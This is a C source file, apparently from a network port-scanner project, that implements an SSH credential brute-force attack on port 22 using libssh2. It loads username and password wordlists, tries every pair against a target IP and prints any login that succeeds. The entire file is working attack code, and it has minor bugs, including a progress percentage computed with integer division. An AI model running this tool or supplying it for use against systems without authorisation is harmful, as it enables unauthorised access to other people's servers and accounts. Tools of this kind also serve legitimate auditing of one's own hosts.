/*
 ============================================================================
 Name        : Hack_port_22.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description : Hack Port 22
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner.h"

#define LIBSSH2_INIT_NO_CRYPTO 0x0001

int hack_port_22(in_addr_t ip, int port){
	//BFA
	printf("%s",HBLUE);
	printf("\nTrying to perform connections by using brute force...\n\n");
	printf("%s",BLUE);
	char *userauthlist;
	int auth_pw = 0, timeouts=0;
	LIBSSH2_SESSION *session=NULL;
	int sk=create_SSH_handshake_session(&session, ip, port);
	const char *fingerprint;
	fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
	printf("Fingerprint: ");
	for(int i = 0; i < 20; i++) {
		printf("%02X ", (unsigned char)fingerprint[i]);
	}
	printf("\n");
	FILE *f=NULL;
	int i=0;
	int totalUsernames=0, totalComb=0, cont=0;
	if((totalUsernames=open_file("usernames.txt",&f))==-1){
		show_error("Opening usernames.txt file error");
		return -1;
	}
	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
	for (i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
	int totalPasswords=0;
	if((totalPasswords=open_file("p22_SSH_passwords.txt",&f))==-1){
		show_error("Opening p22_SSH_passwords.txt file error");
		return -1;
	}
	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
	for (i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
	totalComb=totalUsernames*totalPasswords;
	for(i=0;i<totalUsernames;i++){
		for(int j=0;j<totalPasswords;j++,cont++){
			if(timeouts==1){
				libssh2_session_disconnect(session, "");
				sk=create_SSH_handshake_session(&session, ip, port);
				if(sk<0){
					show_error("Error creating handshake");
					goto exit;
				}
				timeouts=0;
				j--;
			}
			printf("\rPercentaje completed: %.4lf%% (%s/%s)                   ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
			fflush(stdout);
			usleep(BRUTE_FORCE_DELAY);
			userauthlist = libssh2_userauth_list(session, usernames[i], strlen(usernames[i]));
			if(userauthlist==NULL){
				timeouts++;
				continue;
			}
			if(strstr(userauthlist, "password") != NULL) auth_pw |= 1;
			if(strstr(userauthlist, "keyboard-interactive") != NULL) auth_pw |= 2;
			if(strstr(userauthlist, "publickey") != NULL) auth_pw |= 4;
			if(auth_pw & 1) {
				if(libssh2_userauth_password(session, usernames[i], passwords[j])) {
					continue;
				}
				else {
					printf("%s",HRED);
					printf("Authentication by password succeeded. User: %s, password: %s\n", usernames[i],passwords[j]);
					printf("Service Vulnerable\n\n");
					printf("%s",BLUE);
				}
			}else if(auth_pw & 2) {
				timeouts++;
				continue;
			}else if(auth_pw & 4) {
				timeouts++;
				continue;
			}
			else {
				printf("No supported authentication methods found\n");
				timeouts++;
				continue;
			}
		}
	}
	exit:
	libssh2_session_disconnect(session, "");
	libssh2_session_free(session);
	printf("%s", DEFAULT);
	printf("\n");
	close(sk);
	return 0;
}

int create_SSH_handshake_session(LIBSSH2_SESSION **session, in_addr_t ip, int port){
	int rc = libssh2_init(0);
	if(rc != 0) {
		printf("libssh2 initialization failed (%d)\n", rc);
		return 1;
	}
	int sk=socket(AF_INET,SOCK_STREAM, 0);
	if(sk<0){
		printf ("Error creating socket. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(EXIT_FAILURE);
	}
	struct sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port=htons(port);
	serverAddress.sin_addr.s_addr= ip;
	if(connect(sk, (struct sockaddr *) &serverAddress, sizeof(serverAddress))<0){
		printf("Send message connection error. Error message: %s (%d)\n", strerror(errno),errno);
		return -1;
	}
	*session = libssh2_session_init();
	if(libssh2_session_handshake(*session, sk)) {
		printf("Failure establishing SSH session: %s (%d)\n", strerror(errno),errno);
		return -1;
	}
	return sk;
}
